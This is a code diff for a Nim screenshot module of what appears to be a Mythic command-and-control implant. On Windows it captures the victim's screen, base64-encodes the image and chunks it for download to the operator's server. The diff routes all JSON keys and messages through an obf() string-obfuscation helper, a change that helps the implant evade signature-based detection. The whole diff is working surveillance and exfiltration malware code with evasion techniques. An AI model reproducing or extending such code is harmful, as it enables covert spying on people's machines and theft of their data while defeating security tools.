@@ -1,6 +1,8 @@
-import ../config
+import ../utils/debug
+import ../utils/strenc
+import ../utils/m_responses
 import std/[json, strformat, base64, math]
-when defined(posix):
+when defined(linux):
   import posix
 when defined(windows):
   import winim/lean
@@ -10,7 +12,7 @@ when defined(windows):
 const CHUNK_SIZE = 512000  # 512KB chunks
 
 proc getHostname(): string =
-  when defined(posix):
+  when defined(linux):
     var buffer: array[256, char]
     if gethostname(cast[cstring](addr buffer[0]), 256) == 0:
       return $cast[cstring](addr buffer[0])
@@ -74,59 +76,40 @@ proc captureScreenshotData*(): seq[byte] =
 proc screenshot*(taskId: string, params: JsonNode): JsonNode =
   ## Screenshot - captures screen and initiates download to Mythic
   ## This is a background task that chunks the screenshot data
-  let cfg = getConfig()
-  
   when defined(windows):
-    if cfg.debug:
-      echo "[DEBUG] Capturing screenshot"
+    debug "[DEBUG] Capturing screenshot"
     
     try:
       # Capture screenshot
       let screenshotData = captureScreenshotData()
       
       if screenshotData.len == 0:
-        return %*{
-          "task_id": taskId,
-          "completed": true,
-          "status": "error",
-          "user_output": "Failed to capture screenshot"
-        }
+        return mythicError(taskId, obf("Failed to capture screenshot"))
       
       # Calculate chunks
       let totalChunks = int((screenshotData.len.float / CHUNK_SIZE.float).ceil)
       
-      if cfg.debug:
-        echo &"[DEBUG] Screenshot captured: {screenshotData.len} bytes, {totalChunks} chunks"
+      debug &"[DEBUG] Screenshot captured: {screenshotData.len} bytes, {totalChunks} chunks"
       
       # Send initial download response
       let downloadResponse = %*{
-        "total_chunks": totalChunks,
-        "full_path": "",
-        "host": getHostname(),
-        "filename": "",
-        "is_screenshot": true,
-        "chunk_size": CHUNK_SIZE
+        obf("total_chunks"): totalChunks,
+        obf("full_path"): "",
+        obf("host"): getHostname(),
+        obf("filename"): "",
+        obf("is_screenshot"): true,
+        obf("chunk_size"): CHUNK_SIZE
       }
       
       return %*{
-        "task_id": taskId,
-        "download": downloadResponse,
-        "screenshot_data": encode(screenshotData)  # Store for chunking
+        obf("task_id"): taskId,
+        obf("download"): downloadResponse,
+        obf("screenshot_data"): encode(screenshotData)  # Store for chunking
       }
     except Exception as e:
-      return %*{
-        "task_id": taskId,
-        "completed": true,
-        "status": "error",
-        "user_output": &"Failed to capture screenshot: {e.msg}"
-      }
+      return mythicError(taskId, obf("Failed to capture screenshot: ") & e.msg)
   else:
-    return %*{
-      "task_id": taskId,
-      "completed": true,
-      "status": "error",
-      "user_output": "screenshot command is only available on Windows"
-    }
+    return mythicError(taskId, obf("screenshot command is only available on Windows"))
 
 proc processScreenshotChunk*(taskId: string, fileId: string, data: seq[byte], chunkNum: int): JsonNode =
   ## Process a single chunk of the screenshot data
@@ -144,30 +127,20 @@ proc processScreenshotChunk*(taskId: string, fileId: string, data: seq[byte], ch
     let encodedChunk = encode(chunkData)
     
     let chunkResponse = %*{
-      "chunk_num": chunkNum,
-      "file_id": fileId,
-      "chunk_data": encodedChunk,
-      "chunk_size": chunkSize
+      obf("chunk_num"): chunkNum,
+      obf("file_id"): fileId,
+      obf("chunk_data"): encodedChunk,
+      obf("chunk_size"): chunkSize
     }
     
     return %*{
-      "task_id": taskId,
-      "download": chunkResponse
+      obf("task_id"): taskId,
+      obf("download"): chunkResponse
     }
     
   except Exception as e:
-    return %*{
-      "task_id": taskId,
-      "completed": true,
-      "status": "error",
-      "user_output": &"Error processing chunk {chunkNum}: {e.msg}"
-    }
+    return mythicError(taskId, obf("Error processing chunk ") & $chunkNum & ": " & e.msg)
 
 proc completeScreenshot*(taskId: string, fileId: string): JsonNode =
   ## Complete the screenshot task
-  return %*{
-    "task_id": taskId,
-    "completed": true,
-    "status": "success",
-    "user_output": fileId
-  }
+  return mythicSuccess(taskId, fileId)
